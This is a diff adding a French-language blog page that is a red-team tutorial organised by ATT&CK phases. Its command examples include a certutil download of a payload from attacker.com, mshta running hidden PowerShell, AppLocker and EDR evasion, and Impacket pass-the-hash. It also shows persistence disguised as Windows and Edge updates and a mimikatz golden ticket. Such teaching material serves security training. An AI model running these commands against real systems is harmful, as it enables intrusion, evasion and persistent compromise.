@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Red Team Ops : De la reconnaissance à la persistence | Blog</title>
+    <meta name="description"
+        content="Guide complet des opérations Red Team : techniques MITRE ATT&CK, frameworks C2, et méthodes d'évasion.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+        integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer">
+    <style>
+        :root {
+            --primary: #00d4ff;
+            --accent: #ff6b6b;
+            --warning: #ffaa00;
+            --success: #00ff88;
+            --bg: #0a0a0a;
+            --bg-terminal: #0d0d0d;
+            --text: #e4e4e7;
+            --text-secondary: #a1a1aa;
+            --text-muted: #71717a;
+            --border: #27272a;
+            --critical: #ff4444;
+            --purple: #a855f7;
+        }
+
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.8;
+        }
+
+        .container {
+            max-width: 850px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border);
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 24px;
+            max-width: 1100px;
+            margin: 0 auto;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 1.75rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        main {
+            padding-top: 100px;
+            padding-bottom: 60px;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .article-hero {
+            background: linear-gradient(135deg, rgba(168, 85, 247, 0.1) 0%, rgba(0, 0, 0, 0) 50%);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 2.5rem;
+            margin-bottom: 2.5rem;
+            position: relative;
+        }
+
+        .article-hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--purple), var(--critical));
+        }
+
+        .article-meta {
+            display: flex;
+            gap: 0.75rem;
+            margin-bottom: 1.25rem;
+            flex-wrap: wrap;
+        }
+
+        .article-date {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--primary);
+            background: rgba(0, 212, 255, 0.15);
+            padding: 0.35rem 0.75rem;
+            border-radius: 6px;
+        }
+
+        .article-tag {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.7rem;
+            color: var(--purple);
+            background: rgba(168, 85, 247, 0.15);
+            padding: 0.25rem 0.6rem;
+            border-radius: 4px;
+            text-transform: uppercase;
+        }
+
+        .article-tag.offensive {
+            color: var(--critical);
+            background: rgba(255, 68, 68, 0.15);
+        }
+
+        .article-tag.mitre {
+            color: var(--warning);
+            background: rgba(255, 170, 0, 0.2);
+        }
+
+        .article-hero h1 {
+            font-size: 2rem;
+            line-height: 1.25;
+            margin-bottom: 1rem;
+        }
+
+        .article-hero .subtitle {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .hero-stats {
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+            padding-top: 1.25rem;
+            border-top: 1px solid var(--border);
+        }
+
+        .hero-stat {
+            text-align: center;
+        }
+
+        .hero-stat-value {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: var(--purple);
+        }
+
+        .hero-stat-value.warning {
+            color: var(--warning);
+        }
+
+        .hero-stat-value.success {
+            color: var(--success);
+        }
+
+        .hero-stat-label {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+        }
+
+        .article-content h2 {
+            font-size: 1.4rem;
+            margin: 2.5rem 0 1rem;
+            color: var(--primary);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 0.5rem;
+        }
+
+        .article-content h3 {
+            font-size: 1.15rem;
+            margin: 1.5rem 0 0.75rem;
+        }
+
+        .article-content p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content ul,
+        .article-content ol {
+            margin: 1rem 0;
+            padding-left: 1.5rem;
+            color: var(--text-secondary);
+        }
+
+        .article-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        .article-content pre {
+            background: var(--bg-terminal);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+        }
+
+        .article-content code {
+            font-family: 'JetBrains Mono', monospace;
+            background: rgba(0, 212, 255, 0.1);
+            padding: 0.15rem 0.4rem;
+            border-radius: 3px;
+            font-size: 0.9rem;
+        }
+
+        .article-content pre code {
+            background: none;
+            padding: 0;
+        }
+
+        .warning-box {
+            background: rgba(255, 68, 68, 0.1);
+            border: 1px solid rgba(255, 68, 68, 0.3);
+            border-radius: 8px;
+            padding: 1rem 1.25rem;
+            margin: 1.5rem 0;
+        }
+
+        .warning-box strong {
+            color: var(--critical);
+        }
+
+        .info-box {
+            background: rgba(0, 212, 255, 0.1);
+            border-left: 3px solid var(--primary);
+            padding: 1rem;
+            border-radius: 0 8px 8px 0;
+            margin: 1.5rem 0;
+        }
+
+        .purple-box {
+            background: rgba(168, 85, 247, 0.1);
+            border-left: 3px solid var(--purple);
+            padding: 1rem;
+            border-radius: 0 8px 8px 0;
+            margin: 1.5rem 0;
+        }
+
+        .timeline {
+            margin: 1.5rem 0;
+            padding-left: 1.5rem;
+            border-left: 2px solid var(--border);
+        }
+
+        .timeline-item {
+            margin-bottom: 1rem;
+            position: relative;
+        }
+
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -1.65rem;
+            top: 0.5rem;
+            width: 10px;
+            height: 10px;
+            background: var(--purple);
+            border-radius: 50%;
+        }
+
+        .timeline-date {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            color: var(--purple);
+        }
+
+        .mitre-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            font-size: 0.9rem;
+        }
+
+        .mitre-table th,
+        .mitre-table td {
+            border: 1px solid var(--border);
+            padding: 0.75rem;
+            text-align: left;
+        }
+
+        .mitre-table th {
+            background: rgba(168, 85, 247, 0.2);
+            color: var(--purple);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+        }
+
+        .mitre-table td {
+            color: var(--text-secondary);
+        }
+
+        .mitre-table code {
+            font-size: 0.75rem;
+        }
+
+        .c2-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .c2-card {
+            background: var(--bg-terminal);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+        }
+
+        .c2-card h4 {
+            color: var(--primary);
+            font-size: 1rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .c2-card p {
+            font-size: 0.85rem;
+            margin-bottom: 0;
+        }
+
+        .c2-card .tag {
+            display: inline-block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.65rem;
+            padding: 0.2rem 0.4rem;
+            border-radius: 3px;
+            margin-top: 0.5rem;
+        }
+
+        .c2-card .tag.opsec {
+            background: rgba(0, 255, 136, 0.15);
+            color: var(--success);
+        }
+
+        .c2-card .tag.modular {
+            background: rgba(255, 170, 0, 0.15);
+            color: var(--warning);
+        }
+
+        footer {
+            padding: 1.5rem 0;
+            border-top: 1px solid var(--border);
+            text-align: center;
+        }
+
+        footer p {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+
+            .article-hero h1 {
+                font-size: 1.5rem;
+            }
+
+            .mitre-table {
+                font-size: 0.75rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <nav>
+            <a href="../index.html" class="logo">AB_</a>
+            <ul class="nav-links">
+                <li><a href="../index.html">Accueil</a></li>
+                <li><a href="../blog.html">Blog</a></li>
+                <li><a href="../index.html#contact">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main class="container">
+        <a href="../blog.html" class="back-link"><i class="fas fa-arrow-left"></i> Retour aux articles</a>
+
+        <article>
+            <div class="article-hero">
+                <div class="article-meta">
+                    <span class="article-date"><i class="fas fa-calendar"></i> 2026-01-04</span>
+                    <span class="article-tag mitre">MITRE ATT&CK</span>
+                    <span class="article-tag offensive">Offensive</span>
+                    <span class="article-tag">Red Team</span>
+                </div>
+                <h1>Red Team Ops : De la reconnaissance à la persistence</h1>
+                <p class="subtitle">Guide complet des opérations offensives : techniques MITRE ATT&CK, frameworks C2
+                    modernes, et méthodes d'évasion pour simuler des menaces réalistes.</p>
+                <div class="hero-stats">
+                    <div class="hero-stat">
+                        <div class="hero-stat-value">14</div>
+                        <div class="hero-stat-label">Tactiques ATT&CK</div>
+                    </div>
+                    <div class="hero-stat">
+                        <div class="hero-stat-value warning">C2</div>
+                        <div class="hero-stat-label">Frameworks</div>
+                    </div>
+                    <div class="hero-stat">
+                        <div class="hero-stat-value success">OPSEC</div>
+                        <div class="hero-stat-label">Focus</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="article-content">
+                <div class="warning-box">
+                    <strong><i class="fas fa-exclamation-triangle"></i> Avertissement légal</strong> —
+                    Ces techniques sont destinées aux professionnels de la sécurité dans un cadre autorisé. Toute
+                    utilisation non autorisée est illégale.
+                </div>
+
+                <h2>Introduction au Red Teaming</h2>
+                <p>Le Red Teaming simule des attaques réalistes pour évaluer la posture de sécurité d'une organisation.
+                    Contrairement aux pentests traditionnels, les opérations Red Team mettent l'accent sur l'OPSEC
+                    (sécurité opérationnelle) et l'évasion des défenses.</p>
+
+                <div class="info-box">
+                    <strong>Red Team vs Pentest :</strong> Le pentest cherche à trouver un maximum de vulnérabilités. Le
+                    Red Team simule un adversaire réaliste avec des objectifs précis (exfiltration de données, accès à
+                    un système critique).
+                </div>
+
+                <h2>Phase 1 : Reconnaissance</h2>
+                <p>La reconnaissance est la phase la plus critique. Elle détermine le succès de l'opération entière.</p>
+
+                <h3>Reconnaissance passive (OSINT)</h3>
+                <table class="mitre-table">
+                    <thead>
+                        <tr>
+                            <th>Technique</th>
+                            <th>MITRE ID</th>
+                            <th>Outils</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Gather Victim Identity Info</td>
+                            <td><code>T1589</code></td>
+                            <td>theHarvester, LinkedIn, Hunter.io</td>
+                        </tr>
+                        <tr>
+                            <td>Search Open Technical Databases</td>
+                            <td><code>T1596</code></td>
+                            <td>Shodan, Censys, crt.sh</td>
+                        </tr>
+                        <tr>
+                            <td>Search Victim-Owned Websites</td>
+                            <td><code>T1594</code></td>
+                            <td>Wayback Machine, Google Dorks</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <pre><code># Exemple : Énumération de sous-domaines
+subfinder -d target.com -silent | httpx -silent | nuclei -t cves/
+
+# Google Dorks pour fichiers sensibles
+site:target.com filetype:pdf | filetype:xlsx | filetype:docx
+site:target.com inurl:admin | inurl:login | inurl:portal</code></pre>
+
+                <h3>Reconnaissance active</h3>
+                <p>La reconnaissance active laisse des traces. Utiliser des proxies et varier les User-Agents.</p>
+
+                <pre><code># Scan Nmap discret
+nmap -sS -T2 --randomize-hosts -D RND:10 target.com
+
+# Énumération web avec gobuster
+gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10 --delay 100ms</code></pre>
+
+                <h2>Phase 2 : Initial Access</h2>
+                <p>L'accès initial est le moment le plus risqué. Les vecteurs courants incluent :</p>
+
+                <table class="mitre-table">
+                    <thead>
+                        <tr>
+                            <th>Technique</th>
+                            <th>MITRE ID</th>
+                            <th>Description</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Phishing: Spearphishing Attachment</td>
+                            <td><code>T1566.001</code></td>
+                            <td>Documents Office avec macros, fichiers ISO/LNK</td>
+                        </tr>
+                        <tr>
+                            <td>Exploit Public-Facing Application</td>
+                            <td><code>T1190</code></td>
+                            <td>Vulnérabilités web, VPN, services exposés</td>
+                        </tr>
+                        <tr>
+                            <td>Valid Accounts</td>
+                            <td><code>T1078</code></td>
+                            <td>Credentials stuffing, password spraying</td>
+                        </tr>
+                        <tr>
+                            <td>Drive-by Compromise</td>
+                            <td><code>T1189</code></td>
+                            <td>Watering hole, exploitation navigateur</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="purple-box">
+                    <strong>Tendance 2025 :</strong> Les attaquants privilégient les fichiers ISO/IMG contenant des LNK
+                    malveillants, car ils contournent la Mark-of-the-Web (MOTW).
+                </div>
+
+                <h2>Phase 3 : Execution & Evasion</h2>
+                <p>L'évasion des EDR/AV est au cœur des opérations Red Team modernes.</p>
+
+                <h3>Techniques d'évasion</h3>
+                <ul>
+                    <li><strong>AMSI Bypass :</strong> Patcher <code>amsi.dll</code> en mémoire avant d'exécuter du
+                        PowerShell</li>
+                    <li><strong>ETW Patching :</strong> Désactiver Event Tracing for Windows pour éviter la télémétrie
+                    </li>
+                    <li><strong>Direct Syscalls :</strong> Appeler les syscalls NT directement, sans passer par
+                        ntdll.dll</li>
+                    <li><strong>API Unhooking :</strong> Restaurer les fonctions hookées par l'EDR</li>
+                    <li><strong>Process Injection :</strong> Injecter du code dans des processus légitimes</li>
+                </ul>
+
+                <pre><code>// Exemple simplifié : Direct Syscall (NtAllocateVirtualMemory)
+// Au lieu d'appeler VirtualAlloc -> kernel32 -> ntdll -> syscall
+// On appelle directement le syscall
+
+mov r10, rcx
+mov eax, 0x18      ; Numéro syscall NtAllocateVirtualMemory (varie selon Windows)
+syscall
+ret</code></pre>
+
+                <h3>Living Off The Land (LOLBins)</h3>
+                <p>Utiliser des binaires Windows légitimes pour éviter la détection :</p>
+
+                <pre><code># Téléchargement via certutil
+certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe
+
+# Exécution via mshta
+mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(...)"", 0:close")
+
+# Bypass AppLocker via MSBuild
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml</code></pre>
+
+                <h2>Frameworks C2</h2>
+                <p>Le framework Command & Control est le système nerveux de l'opération.</p>
+
+                <div class="c2-grid">
+                    <div class="c2-card">
+                        <h4>Cobalt Strike</h4>
+                        <p>Le standard de l'industrie. Malleable C2 profiles pour personnalisation.</p>
+                        <span class="tag modular">Commercial</span>
+                    </div>
+                    <div class="c2-card">
+                        <h4>Sliver</h4>
+                        <p>Alternative open-source. Supporte mTLS, WireGuard, HTTP(S), DNS.</p>
+                        <span class="tag opsec">Open Source</span>
+                    </div>
+                    <div class="c2-card">
+                        <h4>Havoc</h4>
+                        <p>C2 moderne avec interface moderne. Demon agent très modulaire.</p>
+                        <span class="tag opsec">Open Source</span>
+                    </div>
+                    <div class="c2-card">
+                        <h4>Mythic</h4>
+                        <p>Framework multi-agent. Architecture microservices, très extensible.</p>
+                        <span class="tag modular">Modulaire</span>
+                    </div>
+                    <div class="c2-card">
+                        <h4>Brute Ratel</h4>
+                        <p>Focus sur l'évasion EDR. Badger agent avec syscalls directs.</p>
+                        <span class="tag opsec">Opsec-focused</span>
+                    </div>
+                    <div class="c2-card">
+                        <h4>Nighthawk</h4>
+                        <p>C2 commercial avancé. Techniques d'évasion sophistiquées.</p>
+                        <span class="tag modular">Commercial</span>
+                    </div>
+                </div>
+
+                <h3>Configuration C2 OPSEC</h3>
+                <pre><code># Exemple de profil Malleable C2 (Cobalt Strike)
+set sleeptime "60000";
+set jitter    "30";
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
+
+http-get {
+    set uri "/api/v1/status";
+    client {
+        header "Accept" "application/json";
+        metadata {
+            base64url;
+            prepend "session=";
+            header "Cookie";
+        }
+    }
+}</code></pre>
+
+                <h2>Phase 4 : Privilege Escalation</h2>
+                <p>Une fois l'accès initial obtenu, l'élévation de privilèges est nécessaire.</p>
+
+                <table class="mitre-table">
+                    <thead>
+                        <tr>
+                            <th>Technique</th>
+                            <th>MITRE ID</th>
+                            <th>Exemple</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Token Impersonation</td>
+                            <td><code>T1134.001</code></td>
+                            <td>SeImpersonatePrivilege → SYSTEM</td>
+                        </tr>
+                        <tr>
+                            <td>Scheduled Task</td>
+                            <td><code>T1053.005</code></td>
+                            <td>Tâche planifiée avec privilèges élevés</td>
+                        </tr>
+                        <tr>
+                            <td>Exploitation for Privilege Escalation</td>
+                            <td><code>T1068</code></td>
+                            <td>Exploits kernel (PrintNightmare, etc.)</td>
+                        </tr>
+                        <tr>
+                            <td>Abuse Elevation Control Mechanism</td>
+                            <td><code>T1548</code></td>
+                            <td>UAC Bypass via fodhelper, eventvwr</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <pre><code># Énumération des chemins de privesc (Windows)
+# Avec winPEAS
+.\winPEASx64.exe
+
+# Recherche de credentials en clair
+findstr /si password *.txt *.xml *.config
+
+# SeImpersonate → SYSTEM avec PrintSpoofer
+.\PrintSpoofer64.exe -i -c "C:\Windows\System32\cmd.exe"</code></pre>
+
+                <h2>Phase 5 : Lateral Movement</h2>
+                <p>Le mouvement latéral permet de progresser dans le réseau vers les objectifs.</p>
+
+                <table class="mitre-table">
+                    <thead>
+                        <tr>
+                            <th>Technique</th>
+                            <th>MITRE ID</th>
+                            <th>Protocole/Outil</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Remote Services: SMB/Windows Admin Shares</td>
+                            <td><code>T1021.002</code></td>
+                            <td>PsExec, smbexec, wmiexec</td>
+                        </tr>
+                        <tr>
+                            <td>Remote Services: WinRM</td>
+                            <td><code>T1021.006</code></td>
+                            <td>Evil-WinRM, PowerShell Remoting</td>
+                        </tr>
+                        <tr>
+                            <td>Use Alternate Authentication Material</td>
+                            <td><code>T1550</code></td>
+                            <td>Pass-the-Hash, Pass-the-Ticket</td>
+                        </tr>
+                        <tr>
+                            <td>Remote Services: RDP</td>
+                            <td><code>T1021.001</code></td>
+                            <td>xfreerdp, SharpRDP</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <pre><code># Pass-the-Hash avec Impacket
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.10
+
+# WMI Execution
+impacket-wmiexec domain/user:password@192.168.1.10
+
+# DCOM Execution (plus discret)
+impacket-dcomexec domain/user:password@192.168.1.10</code></pre>
+
+                <h2>Phase 6 : Persistence</h2>
+                <p>La persistence assure le maintien de l'accès même après un reboot ou une réponse incident partielle.
+                </p>
+
+                <table class="mitre-table">
+                    <thead>
+                        <tr>
+                            <th>Technique</th>
+                            <th>MITRE ID</th>
+                            <th>Localisation</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Registry Run Keys</td>
+                            <td><code>T1547.001</code></td>
+                            <td>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</td>
+                        </tr>
+                        <tr>
+                            <td>Scheduled Task</td>
+                            <td><code>T1053.005</code></td>
+                            <td>Task Scheduler</td>
+                        </tr>
+                        <tr>
+                            <td>Create Account</td>
+                            <td><code>T1136</code></td>
+                            <td>Utilisateur local/domaine caché</td>
+                        </tr>
+                        <tr>
+                            <td>Server Software Component: Web Shell</td>
+                            <td><code>T1505.003</code></td>
+                            <td>Serveurs web compromis</td>
+                        </tr>
+                        <tr>
+                            <td>Boot or Logon Autostart: Startup Folder</td>
+                            <td><code>T1547.001</code></td>
+                            <td>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <pre><code># Persistence via Registry (détectable)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Public\update.exe"
+
+# Scheduled Task (plus discret)
+schtasks /create /tn "MicrosoftEdgeUpdateCore" /tr "C:\Users\Public\update.exe" /sc onlogon /ru SYSTEM
+
+# Golden Ticket (persistence domaine ultime)
+# Nécessite le hash KRBTGT
+mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /ptt</code></pre>
+
+                <div class="warning-box">
+                    <strong><i class="fas fa-skull-crossbones"></i> Golden Ticket</strong> —
+                    Un Golden Ticket reste valide jusqu'à ce que le mot de passe KRBTGT soit changé deux fois. C'est la
+                    persistence la plus puissante sur un domaine AD.
+                </div>
+
+                <h2>OPSEC : Règles d'or</h2>
+                <ol>
+                    <li><strong>Blending in :</strong> Imiter le trafic réseau légitime (horaires de bureau, User-Agents
+                        réalistes)</li>
+                    <li><strong>Minimiser l'empreinte :</strong> Éviter d'écrire sur disque, utiliser le reflective
+                        loading</li>
+                    <li><strong>Segmenter l'infrastructure :</strong> Redirecteurs → Team servers → Backend</li>
+                    <li><strong>Chiffrer tout :</strong> Communications C2, données exfiltrées</li>
+                    <li><strong>Surveiller les IOCs :</strong> Vérifier régulièrement si votre infrastructure est
+                        flaggée</li>
+                    <li><strong>Kill dates :</strong> Implants qui s'auto-détruisent après une date limite</li>
+                </ol>
+
+                <h2>Ressources & Références</h2>
+                <ul>
+                    <li><a href="https://attack.mitre.org/" target="_blank" rel="noopener">MITRE ATT&CK Framework</a>
+                    </li>
+                    <li><a href="https://www.cobaltstrike.com/" target="_blank" rel="noopener">Cobalt Strike
+                            Documentation</a></li>
+                    <li><a href="https://github.com/BishopFox/sliver" target="_blank" rel="noopener">Sliver C2
+                            Framework</a></li>
+                    <li><a href="https://github.com/HavocFramework/Havoc" target="_blank" rel="noopener">Havoc
+                            Framework</a></li>
+                    <li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS Project</a>
+                    </li>
+                    <li><a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener">HackTricks</a></li>
+                </ul>
+            </div>
+        </article>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>© 2026 Abdelaaziz Belkhair</p>
+        </div>
+    </footer>
+</body>
+
+</html>
